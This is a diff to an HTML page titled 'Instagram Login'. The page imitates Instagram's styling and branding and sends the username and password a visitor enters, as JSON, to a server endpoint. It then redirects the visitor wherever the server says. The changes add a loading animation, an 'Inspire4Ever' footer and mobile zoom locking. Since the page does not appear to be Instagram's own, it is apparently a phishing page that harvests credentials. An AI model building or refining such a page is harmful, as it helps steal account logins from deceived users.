@@ -4,25 +4,125 @@
   <meta charset="UTF-8">
   <title>Instagram Login</title>
   <style>
-    body { font-family: Poppins; background: linear-gradient(135deg, #f09433, #bc1888); height: 100vh; display: flex; justify-content: center; align-items: center; margin: 0; }
-    .container { background: #fff; padding: 30px; border-radius: 16px; width: 350px; text-align: center; box-shadow: 0 0 20px rgba(0,0,0,0.2); }
-    input, button { width: 90%; padding: 10px; margin: 10px 0; border-radius: 8px; border: 1px solid #ccc; font-size: 14px; }
-    button { background: linear-gradient(45deg, #f09433, #bc1888); color: #fff; border: none; cursor: pointer; }
-    #response { margin-top: 10px; font-weight: bold; }
-    .hidden { display: none; }
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: Poppins, sans-serif; }
+
+    body {
+      background: linear-gradient(135deg, #f09433, #bc1888);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .container {
+      background: #fff;
+      width: 360px;
+      max-width: 360px;
+      padding: 35px 25px;
+      border-radius: 20px;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.25);
+      -webkit-user-scalable: none;
+    }
+
+    h2 {
+      margin-bottom: 20px;
+      font-size: 24px;
+      color: #333;
+      font-weight: 600;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 14px;
+      margin: 12px 0;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+      font-size: 15px;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #bc1888;
+      box-shadow: 0 0 8px rgba(188,24,136,0.3);
+    }
+
+    button {
+      background: linear-gradient(45deg, #f09433, #bc1888);
+      color: #fff;
+      border: none;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      opacity: 0.9;
+      transform: scale(1.02);
+    }
+
+    #response {
+      margin-top: 10px;
+      font-weight: bold;
+      color: #d00000;
+      min-height: 22px;
+    }
+
+    .footer {
+      margin-top: 25px;
+      font-size: 13px;
+      opacity: 0.7;
+    }
+    .loader {
+  display: none;
+  margin-top: 15px;
+}
+
+.loader div {
+  width: 14px;
+  height: 14px;
+  background: #bc1888;
+  border-radius: 50%;
+  display: inline-block;
+  animation: bounce 0.6s infinite alternate;
+}
+
+.loader div:nth-child(2) {
+  animation-delay: 0.2s;
+}
+.loader div:nth-child(3) {
+  animation-delay: 0.4s;
+}
+
+@keyframes bounce {
+  to { transform: translateY(-8px); }
+}
+
   </style>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 </head>
 <body>
 <div class="container">
-  <h2>Instagram Login</h2>
+  <h2>Log From Your Instagram</h2>
   <input id="username" placeholder="Username"><br>
   <input id="password" type="password" placeholder="Password"><br>
   <button onclick="login()">Login</button>
+  <div class="loader" id="loader">
+  <div></div><div></div><div></div>
+</div>
+
   <p id="response"></p>
+
+  <div class="footer">© 2025 Inspire4Ever — All Rights Reserved</div>
 </div>
 
 <script>
 async function login() {
+    document.getElementById("response").innerText = "";
+    document.getElementById("loader").style.display = "inline-block";
+
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
 
@@ -31,14 +131,18 @@ async function login() {
         headers:{'Content-Type':'application/json'},
         body:JSON.stringify({username,password})
     });
+
     const data = await res.json();
+
+    document.getElementById("loader").style.display = "none";
+
     if(data.ok && data.redirect){
         window.location.href = data.redirect;
     } else {
         document.getElementById('response').innerText = data.message || data.error;
     }
 }
+
 </script>
 </body>
 </html>
-  
